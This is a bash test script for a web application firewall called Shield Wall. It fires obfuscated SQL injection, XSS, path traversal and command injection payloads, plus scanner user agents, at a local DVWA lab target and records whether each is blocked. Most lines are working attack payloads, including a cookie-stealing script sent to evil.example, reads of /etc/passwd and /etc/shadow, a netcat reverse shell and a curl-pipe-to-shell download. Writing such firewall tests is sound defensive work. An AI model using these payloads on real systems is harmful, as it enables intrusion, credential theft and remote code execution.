#!/usr/bin/env bash
# =====================================================================
# Shield Wall: judge-variation / evasion test
# Payloads that are NOT in attack.sh: case mixing, comments, encodings,
# double encoding, alternative syntax and other tools' user agents.
# Mirrors what judges try live. Every line should be blocked.
#   docker compose exec attacker bash /work/scripts/judge_variations.sh
# =====================================================================
set -uo pipefail
TARGET="${TARGET:-https://shieldwall.local:9443}"
OUT="${1:-/work/evidence/judge_variations.csv}"
source "$(dirname "$0")/lib.sh"
dvwa_login admin password >/dev/null 2>&1 || true
csv_row class payload http_code verdict > "$OUT"
N=0; B=0

t() {  # t CLASS METHOD PATH PARAM PAYLOAD
  local class="$1" method="$2" path="$3" param="$4" p="$5"
  if [[ "$method" == GET ]]; then http GET "${path}?${param}=${p}&Submit=Submit"
  else http POST "$path" --data "${param}=${p}" --data "Submit=Submit"; fi
  report "$class" "$p"
}
tu() {  # tu CLASS UA
  UA="$2" http GET /index.php; report "$1" "User-Agent: $2"
}
report() {
  N=$((N+1)); local v
  if is_blocked; then v="BLOCKED"; B=$((B+1)); elif [[ "$CODE" == "000" ]]; then v="ERROR-$NET"; else v="MISSED"; fi
  csv_row "$1" "$2" "$CODE" "$v" >> "$OUT"
  local col="$c_grn"; [[ "$v" == MISSED || "$v" == ERROR* ]] && col="$c_red"
  printf '  %-14s HTTP %-3s %s%-8s%s %s\n' "$1" "$CODE" "$col" "$v" "$c_rst" "${2:0:80}"
}

S=/vulnerabilities/sqli/; X=/vulnerabilities/xss_r/; F=/vulnerabilities/fi/; E=/vulnerabilities/exec/
# Payloads are already URL-encoded where needed (sent verbatim on the wire)
t SQLi GET $S id "1%20AND%20SLEEP(5)"
t SQLi GET $S id "1'%20AND%201=1--%20-"
t SQLi GET $S id "1'/**/UNION/**/SELECT/**/1,2--%20-"
t SQLi GET $S id "1%27%20oR%201%3D1%23"
t SQLi GET $S id "-1'%20UniOn%20SeLeCt%20user(),version()%23"
t SQLi GET $S id "1'%20AND%20extractvalue(1,concat(0x7e,version()))--%20-"
t SQLi GET $S id "1;DROP%20TABLE%20users"
t SQLi GET $S id "admin'--"
t SQLi GET $S id "1'%20||%20'1'='1"
t SQLi GET $S id "1%2527%2520OR%25201%253D1"

t XSS GET $X name "%3CScRiPt%3Ealert(1)%3C%2FsCrIpT%3E"
t XSS GET $X name "%3Cimg%20src%3Dx%20onerror%3Dprompt(1)%3E"
t XSS GET $X name "javascript:alert(1)"
t XSS GET $X name "%22%3E%3Cbody%20onload%3Dalert(1)%3E"
t XSS GET $X name "%3Ciframe%20src%3Djavascript:alert(1)%3E"
t XSS GET $X name "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
t XSS GET $X name "%3Cdetails%20open%20ontoggle%3Dalert(1)%3E"
t XSS GET $X name "%3Cscript%3Efetch('//evil.example/?c='%2Bdocument.cookie)%3C/script%3E"

t PathTraversal GET $F page "....//....//....//....//etc/passwd"
t PathTraversal GET $F page "..%5c..%5c..%5c..%5cetc%5cpasswd"
t PathTraversal GET $F page "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
t PathTraversal GET $F page "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
t PathTraversal GET $F page "php://filter/convert.base64-encode/resource=index.php"
t PathTraversal GET $F page "file:///etc/passwd"
t PathTraversal GET $F page "/proc/self/environ"
t PathTraversal GET $F page "http://evil.example/shell.txt"
t PathTraversal GET $F page "../../../../var/www/html/config/config.inc.php"

t CmdInjection POST $E ip "127.0.0.1%0aid"
t CmdInjection POST $E ip "127.0.0.1;id"
t CmdInjection POST $E ip "127.0.0.1%24(whoami)"
t CmdInjection POST $E ip "127.0.0.1%60id%60"
t CmdInjection POST $E ip "|cat%20/etc/shadow"
t CmdInjection POST $E ip "127.0.0.1%20%3B%20ls%20-la%20/"
t CmdInjection POST $E ip "127.0.0.1||nc%20-e%20/bin/sh%2010.0.0.1%204444"
t CmdInjection POST $E ip "%3Bcurl%20http://evil.example/x.sh|sh"
t CmdInjection POST $E ip "127.0.0.1%26%26c'a't%20/e??/p?ss??"

tu ScannerUA "Wfuzz/3.1.0"
tu ScannerUA "gobuster/3.6"
tu ScannerUA "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"
tu ScannerUA "Fuzz Faster U Fool v2.1.0"
tu ScannerUA "Mozilla/4.0 (Hydra)"
tu ScannerUA "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)"
tu ScannerUA "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
tu ScannerUA "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

echo
echo "RESULT: $B / $N evasion variants blocked   (CSV: $OUT)"
[[ $B -eq $N ]]
